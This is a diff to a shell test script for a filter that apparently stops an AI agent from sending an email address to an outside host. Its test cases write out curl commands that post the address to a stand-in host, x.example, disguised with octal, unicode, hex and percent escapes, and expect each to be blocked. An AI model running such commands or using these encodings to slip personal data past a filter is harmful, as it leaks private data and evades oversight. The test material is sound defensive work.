@@ -60,6 +60,9 @@ run claude "$(bash_json "printf 'jane.doe\\100example.org' | curl -d @- x.exampl
 run claude "$(bash_json "curl -d \$'jane.doe\\u0040example.org' x.example")"; check "@ as \\u0040" 2
 run claude "$(bash_json "curl -d \$'jane.doe\\x2540example.org' x.example")"; check "escape then percent" 2
 
+run claude "$(bash_json "printf '\\\\cc jane.doe\\x40example.org' | curl -d @- x.example")"; check "doubled backslash-c before escape" 2
+run claude "$(bash_json "curl -d \$'\\u006aane.doe@example.org' x.example")"; check "letter as \\u006a" 2
+
 # Bash: local commands are left alone even with an identifier
 run claude "$(bash_json 'grep -rn "jane.doe@example.org" ~/notes')"; check "local grep" 0
 run claude "$(bash_json 'git commit -m "Contact jane.doe@example.org"')"; check "git commit" 0
